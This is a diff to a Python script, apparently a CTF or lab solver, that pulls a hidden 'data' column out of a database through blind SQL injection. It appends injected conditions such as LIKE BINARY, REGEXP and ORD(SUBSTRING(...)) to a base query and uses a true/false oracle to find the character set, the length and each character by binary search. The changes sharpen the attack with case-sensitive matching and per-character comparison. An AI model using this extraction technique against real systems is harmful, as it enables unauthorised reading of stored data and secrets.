@@ -25,7 +25,7 @@ def determine_charset():
     base64_charset = string.ascii_letters + string.digits + "_-"
     actual_charset = ""
     for ch in base64_charset:
-        if id_matches(BASE_QUERY + f" AND `data` like '%{ch}%'"):
+        if id_matches(BASE_QUERY + f" AND `data` LIKE BINARY '%{ch}%'"):
             actual_charset += ch
             print(f"{ch}: Y")
         else:
@@ -66,8 +66,8 @@ def main():
     data_len = determine_data_length()
     assert(id_matches(BASE_QUERY + f" AND `data` REGEXP '^[{charset}]+$' AND LENGTH(`data`) = {data_len}"))
     
-    def gt(guess):
-        query = BASE_QUERY + f" AND SUBSTRING(`data`, 1, {len(guess)}) > '{guess}'"
+    def gt(ch:str, idx:int):
+        query = BASE_QUERY + f" AND ORD(SUBSTRING(`data`, {idx + 1}, 1)) > '{ord(ch)}'"
         return id_matches(query)
 
     data = ""
@@ -76,16 +76,14 @@ def main():
         while len(chs) > 1:
             idx = (len(chs) // 2) - 1
             ch = chs[idx]
-            guess = data[:i] + ch
             print("chs=", chs)
-            print("guess=", guess)
-            if gt(guess):
+            print("ch=", ch)
+            if gt(ch, i):
                 print("gt")
                 chs = chs[idx+1:]
             else:
                 print("lt_eq")
                 chs = chs[:idx+1]
-            print("")
         data += chs[0]
         print("data=", data)
         print("")
